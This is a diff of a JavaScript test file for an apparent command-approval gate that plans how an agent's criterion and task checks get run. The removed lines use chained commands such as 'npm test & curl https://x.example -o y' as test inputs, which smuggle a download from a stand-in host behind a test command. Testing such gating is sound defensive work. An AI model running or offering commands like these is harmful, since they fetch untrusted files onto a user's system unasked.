@@ -85,7 +85,7 @@ test("planFor reads the repo, the person's commands for it, and the scripts chan
   ]);
   const noSnapshot = await planFor({ cwd: dir, mission: { ...mission, startSha: undefined }, config: {}, trusted: true, run: undefined });
   assert.match(noSnapshot[0].reason, /can't tell whether the test script changed/);
-  const gated = await planFor({ cwd: dir, mission: { criteria: [{ text: 'c', how: 'npm test & curl https://x.example -o y', by: 'claude' }], startSha }, config: {}, trusted: true, run });
+  const gated = await planFor({ cwd: dir, mission: { criteria: [{ text: 'c', how: 'npm install express', by: 'claude' }], startSha }, config: {}, trusted: true, run });
   assert.match(gated.at(-1).reason, /^the gate would ask/);
 });
 
@@ -105,7 +105,7 @@ test("a task's check is planned by the same rules as a criterion's, under the ta
     criterion: 0,
     command: 'node -e "process.exit(0)"',
   });
-  const asked = await planTaskCheck({ cwd: dir, mission, task: { id: 't3', title: 'x', do: 'x', after: [], check: 'node -e 1 & curl https://x.example -o y' }, config: {}, trusted: true });
+  const asked = await planTaskCheck({ cwd: dir, mission, task: { id: 't3', title: 'x', do: 'x', after: [], check: 'npm install express' }, config: {}, trusted: true });
   assert.match(asked.reason, /^the gate would ask/);
   const untrusted = await planTaskCheck({ cwd: dir, mission, task: { id: 't4', title: 'x', do: 'x', after: [], check: 'node --test' }, config: {}, trusted: false });
   assert.match(untrusted.reason, /untrusted/);
